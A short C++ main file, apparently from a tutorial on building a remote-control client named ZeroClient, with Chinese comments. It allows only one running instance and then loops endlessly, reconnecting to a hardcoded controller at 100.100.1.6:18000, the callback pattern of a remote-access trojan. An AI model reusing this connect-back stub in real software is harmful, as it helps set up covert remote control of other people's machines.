#include <winsock2.h>
#include <windows.h>
#include <iostream>
#include "ZeroClient.h"
#pragma comment(lib,"ws2_32.lib")
#pragma execution_character_set("utf-8")
int main()
{
    
    char szFile[MAX_PATH];
    char* szPt;


    GetModuleFileNameA(NULL, szFile, sizeof(szFile));
    szPt = szFile + strlen(szFile);
    while (*--szPt != '\\');


    CreateMutexA(NULL, FALSE, szPt + 1);
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        std::cout << "已经有相同程序开启" << std::endl;
        return -1;
    }


    // 初始化Windows socket功能，要在Windows使用网络必须初始化这个
    WSAData wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData)) {
        std::cout << "初始化WSA失败\n" << std::endl;
        return -1;
    }


    // 主循环，下面会讲
    while (1) {
        // 主循环
        ZeroClient client;
        while (1) {
            // 如果断开了，隔一秒自动连接
            client.connectTo("100.100.1.6", 18000);
            Sleep(100);
        }

        Sleep(1000);
    }


    // 程序完结后释放WSA
    WSACleanup();


    return 0;
}